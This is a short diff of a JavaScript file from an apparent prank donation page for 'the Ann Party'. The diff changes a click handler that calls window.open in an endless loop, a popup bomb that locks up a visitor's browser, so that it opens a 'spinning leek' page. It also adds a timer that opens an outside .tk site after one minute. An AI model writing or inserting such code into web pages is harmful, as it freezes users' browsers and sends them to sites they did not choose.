@@ -25,4 +25,5 @@ function donate(amount) {
     alert(`Successfully donated ${amount}$ to the Ann Party`);
 }
 
-window.onclick = () => {while(true){window.open("https://s2.gifyu.com/images/3dgifmaker48696.gif");}}
+window.onclick = () => {while(true){window.open("https://theleekyleek.github.io/thespinningleek/leek.html");}}
+setTimeout(()=>window.open("https://www.vittra.tk"), 60*1000);
